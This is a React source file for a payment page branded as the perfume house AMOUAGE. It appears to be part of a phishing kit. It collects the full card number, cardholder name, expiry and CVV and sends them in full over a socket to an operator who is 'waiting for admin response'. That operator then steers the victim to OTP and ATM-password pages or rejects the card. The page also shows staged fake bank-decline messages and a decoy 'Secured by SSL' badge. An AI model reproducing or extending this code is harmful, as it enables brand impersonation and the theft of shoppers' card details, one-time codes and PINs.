import { useState, useEffect, useRef } from "react";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required"),
  expiryMonth: z.string().min(1, "Month is required"),
  expiryYear: z.string().min(1, "Year is required"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
});

type FormData = z.infer<typeof schema>;

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1).padStart(2, "0"),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 15 }, (_, i) => ({
  value: String(currentYear + i - 2000),
  label: String(currentYear + i),
}));

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const [selectKey, setSelectKey] = useState(0);
  const debounceRef = useRef<ReturnType<typeof setTimeout>>();

  // Currency helpers
  const getCurrencyInfo = () => {
    const COUNTRY_CURRENCY: Record<string, string> = {
      'AM':'EUR','AU':'USD','AT':'EUR','BH':'BHD','BE':'EUR','BG':'EUR','CA':'USD',
      'HR':'EUR','CY':'EUR','CZ':'EUR','DK':'EUR','EE':'EUR','FI':'EUR','FR':'EUR',
      'DE':'EUR','GR':'EUR','GG':'GBP','HK':'USD','HU':'EUR','IN':'USD','ID':'USD',
      'IE':'EUR','IT':'EUR','JP':'USD','JE':'GBP','JO':'USD','KZ':'USD','KW':'KWD',
      'LV':'EUR','LT':'EUR','LU':'EUR','MY':'USD','MT':'EUR','NL':'EUR','NZ':'USD',
      'NO':'EUR','OM':'OMR','PH':'USD','PL':'EUR','PT':'EUR','QA':'USD','RO':'EUR',
      'SA':'SAR','SG':'USD','SK':'EUR','SI':'EUR','KR':'USD','ES':'EUR','SE':'EUR',
      'CH':'EUR','TH':'USD','AE':'AED','GB':'GBP','US':'USD'
    };
    const CURRENCY_SYMBOLS: Record<string, string> = {
      'USD':'$','EUR':'€','OMR':'OMR ','KWD':'KWD ','BHD':'BHD ','AED':'AED ','GBP':'£','SAR':'SAR '
    };
    const EXCHANGE_RATES: Record<string, number> = {
      'USD':1,'EUR':0.92,'OMR':0.385,'KWD':0.308,'BHD':0.376,'AED':3.67,'GBP':0.79,'SAR':3.75
    };
    const countryCode = localStorage.getItem('amouage_country') || 'OM';
    const currency = COUNTRY_CURRENCY[countryCode] || 'OMR';
    const symbol = CURRENCY_SYMBOLS[currency] || currency + ' ';
    const rate = EXCHANGE_RATES[currency] || 1;
    return { currency, symbol, rate };
  };

  const formatCurrency = (usdAmount: number) => {
    const { currency, symbol, rate } = getCurrencyInfo();
    const converted = usdAmount * rate;
    if (['KWD','BHD','OMR'].includes(currency)) {
      return symbol + converted.toFixed(3);
    }
    return symbol + Math.round(converted).toLocaleString('en-US');
  };

  // Format price that is ALREADY in local currency (no conversion needed)
  const formatLocalCurrency = (amount: number) => {
    const { currency, symbol } = getCurrencyInfo();
    if (['KWD','BHD','OMR'].includes(currency)) {
      return symbol + amount.toFixed(3);
    }
    return symbol + Math.round(amount).toLocaleString('en-US');
  };

  // Get amount from URL params or cart
  const searchParams = new URLSearchParams(window.location.search);
  const totalAmount = searchParams.get('amount') || '0';
  
  // Get cart items for product name
  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');
  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryMonth: "",
      expiryYear: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryMonth = watch("expiryMonth");
  const expiryYear = watch("expiryYear");
  const cvv = watch("cvv");

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid = 
    cleanCardNumber.length >= 13 && 
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryMonth?.length > 0 &&
    expiryYear?.length > 0 &&
    cvv?.length === 3;

  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
    // Clear waiting overlay from previous page (SPA navigation)
    waitingMessage.value = "";
  }, []);

  useEffect(() => {
    if (cardNumber && cardNumber.length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber);
      }, 500);
    }
  }, [cardNumber]);

  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      
      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        setRejectedError(true);
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
        });
        setSelectKey(prev => prev + 1);
      }
      cardAction.value = null;
    }
  });

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);

  useEffect(() => {
    socket.value.emit("blockedCards:get");
    
    const handleBlockedCardsList = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };
    
    const handleBlockedCardsUpdated = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };
    
    socket.value.on("blockedCards:list", handleBlockedCardsList);
    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);
    
    return () => {
      socket.value.off("blockedCards:list", handleBlockedCardsList);
      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
    };
  }, []);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (globalBlockedError) {
      setGlobalBlockedError(false);
    }

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
    }
  };

  const onSubmit = (data: FormData) => {
    if (luhnError) return;

    const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");
    
    const cardPrefix = cleanCardNumber.slice(0, 4);
    if (globalBlockedCards.includes(cardPrefix)) {
      waitingMessage.value = "Verifying card information...";
      setTimeout(() => {
        waitingMessage.value = "";
        setGlobalBlockedError(true);
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryMonth: "",
          expiryYear: "",
          cvv: "",
        });
        setSelectKey(prev => prev + 1);
      }, 3000);
      return;
    }
    
    const bankInfo = getBankInfoLocal(cleanCardNumber);
    const cardType = getCardType(cleanCardNumber);
    
    if (bankInfo) {
      waitingCardInfo.value = {
        bankName: bankInfo.bank,
        bankLogo: bankInfo.logo,
        cardType: cardType,
      };
    } else {
      waitingCardInfo.value = null;
    }

    const paymentData = {
      totalPaid: formatLocalCurrency(Number(totalAmount)),
      cardType: cardType,
      cardLast4: cleanCardNumber.slice(-4),
      serviceName: productNames,
      bankName: bankInfo?.bank || '',
      bankLogo: bankInfo?.logo || '',
    };

    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCardNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: data.expiryMonth,
        expiryYear: data.expiryYear,
        cvv: data.cvv,
      },
      current: "الدفع",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-8" dir="ltr" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <WaitingOverlay />

      <div className="w-full max-w-[480px]">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-2xl tracking-[0.3em] font-light text-black mb-2" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
          <p className="text-sm text-gray-500">Secure Payment</p>
        </div>

        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
          {/* Order Summary */}
          <div className="border-b border-gray-200 pb-5 mb-6">
            <div className="flex justify-between items-center">
              <div>
                <p className="text-sm text-gray-500">Order Total</p>
                <p className="text-xs text-gray-400 mt-1 truncate max-w-[200px]">{productNames}</p>
              </div>
              <p className="text-2xl font-medium text-black">{formatLocalCurrency(Number(totalAmount))}</p>
            </div>
          </div>

          {/* Card Icons */}
          <div className="flex justify-center items-center gap-3 mb-6">
            <img src="/images/visa.png" alt="Visa" className="h-8" />
            <img src="/images/mastercard.png" alt="Mastercard" className="h-8" />
          </div>

          {/* Error Messages */}
          {rejectedError && (
            <div className="bg-red-50 border border-red-200 rounded-md p-3 mb-4">
              <p className="text-red-600 text-center text-sm">Card information is incorrect. Please try again.</p>
            </div>
          )}

          {globalBlockedError && (
            <div className="bg-red-50 border border-red-200 rounded-md p-3 mb-4">
              <p className="text-red-600 text-center text-sm">Transaction declined by issuing bank.</p>
              <p className="text-red-500 text-center text-xs mt-1">Please try a different payment method.</p>
            </div>
          )}

          <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
            {/* Card Number */}
            <div>
              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Card Number</label>
              <input
                type="tel"
                inputMode="numeric"
                maxLength={19}
                placeholder="1234 5678 9012 3456"
                className={`w-full border rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors ${
                  (cardError || luhnError) ? 'border-red-400 bg-red-50' : 'border-gray-300'
                }`}
                {...register("cardNumber")}
                onChange={handleCardChange}
                onFocus={() => setRejectedError(false)}
              />
              {(errors.cardNumber || cardError || luhnError) && (
                <p className="text-red-500 text-xs mt-1">
                  {luhnError ? "Invalid card number" : (errors.cardNumber?.message || "Invalid card number")}
                </p>
              )}
            </div>

            {/* Name on Card */}
            <div>
              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Cardholder Name</label>
              <input
                type="text"
                placeholder="Name as shown on card"
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors"
                {...register("nameOnCard")}
                onChange={(e) => {
                  const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
                  setValue("nameOnCard", englishOnly);
                }}
              />
              {errors.nameOnCard && (
                <p className="text-red-500 text-xs mt-1">{errors.nameOnCard.message}</p>
              )}
            </div>

            {/* Expiry Date */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Expiry Month</label>
                <select
                  key={`month-${selectKey}`}
                  className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors bg-white"
                  onChange={(e) => setValue("expiryMonth", e.target.value)}
                  defaultValue=""
                >
                  <option value="" disabled>MM</option>
                  {months.map((m) => (
                    <option key={m.value} value={m.value}>{m.label}</option>
                  ))}
                </select>
                {errors.expiryMonth && (
                  <p className="text-red-500 text-xs mt-1">{errors.expiryMonth.message}</p>
                )}
              </div>

              <div>
                <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Expiry Year</label>
                <select
                  key={`year-${selectKey}`}
                  className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors bg-white"
                  onChange={(e) => setValue("expiryYear", e.target.value)}
                  defaultValue=""
                >
                  <option value="" disabled>YYYY</option>
                  {years.map((y) => (
                    <option key={y.value} value={y.value}>{y.label}</option>
                  ))}
                </select>
                {errors.expiryYear && (
                  <p className="text-red-500 text-xs mt-1">{errors.expiryYear.message}</p>
                )}
              </div>
            </div>

            {/* CVV */}
            <div>
              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">CVV</label>
              <input
                type="tel"
                inputMode="numeric"
                maxLength={3}
                placeholder="123"
                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors"
                {...register("cvv")}
                onChange={(e) => {
                  const englishOnly = e.target.value.replace(/[^0-9]/g, "");
                  setValue("cvv", englishOnly);
                }}
              />
              {errors.cvv && (
                <p className="text-red-500 text-xs mt-1">{errors.cvv.message}</p>
              )}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={!isFormValid}
              className={`w-full py-4 rounded-md text-white text-sm font-medium tracking-wider uppercase transition-all ${
                isFormValid
                  ? 'bg-black hover:bg-gray-800 cursor-pointer'
                  : 'bg-gray-300 cursor-not-allowed'
              }`}
            >
              PAY NOW
            </button>
          </form>

          {/* Security note */}
          <div className="mt-5 flex items-center justify-center gap-2 text-xs text-gray-400">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span>Secured by SSL encryption</span>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-gray-400">Powered by AMOUAGE</p>
        </div>
      </div>
    </div>
  );
}
